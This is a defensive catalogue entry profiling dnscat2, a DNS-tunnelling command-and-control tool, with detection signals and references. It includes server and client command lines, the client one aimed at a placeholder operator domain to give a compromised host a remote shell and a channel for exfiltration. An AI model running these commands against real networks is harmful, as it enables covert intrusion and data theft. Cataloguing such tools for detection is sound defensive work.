---
Name: dnscat2
Description: dnscat2 is a self-hosted tool that creates an encrypted command-and-control channel over the DNS protocol, tunnelling traffic through queries (TXT, MX, CNAME, A) so it survives in networks where only DNS leaves. The operator runs the Ruby server on an authoritative domain and the compromised host runs the C client, which provides a remote shell, port forwarding and file transfer over the tunnel. Because the operator controls the authoritative name server, blocking relies on the binary and DNS-tunneling signal rather than a fixed vendor domain. It is abused for covert C2, observed with the Silence APT and the Symbiote Linux threat, among others.
Author: cyberbuff
Created: 2026-09-22
Commands:
    - Command: ruby dnscat2.rb <TUNNEL_DOMAIN>
      Description: Starts the operator-controlled dnscat2 server, listening for clients tunnelling through the authoritative domain and exposing an interactive multi-session console.
      Usecase: Standing up the DNS C2 endpoint on a domain the operator controls.
      Category: Access
      Privileges: User
      OperatingSystem: Linux, MacOS, BSD

    - Command: ./dnscat2 --secret <SECRET> <TUNNEL_DOMAIN>
      Description: Runs the client on a compromised host, establishing an encrypted DNS tunnel to the server for a remote shell, port forwarding or file transfer (--dns server=<ip>,port=53 dials a resolver directly).
      Usecase: Covert command-and-control, tunnelling and exfiltration out of a network that only permits DNS.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS, BSD
Custom_Domain_Supported: True
Full_Path:
    - Path: dnscat2.rb Ruby server on the operator's authoritative name server and the compiled dnscat2 C client on the compromised host.
Detection:
    - Command: "Execution of the dnscat2 client or dnscat2.rb server, and anomalous DNS traffic consistent with encrypted DNS tunneling (high-entropy TXT/MX/CNAME query and response volume to a single domain)."
Resources:
    - Link: https://github.com/iagox86/dnscat2
    - Link: https://www.activecountermeasures.com/malware-of-the-day-dnscat2-dns-tunneling/
---
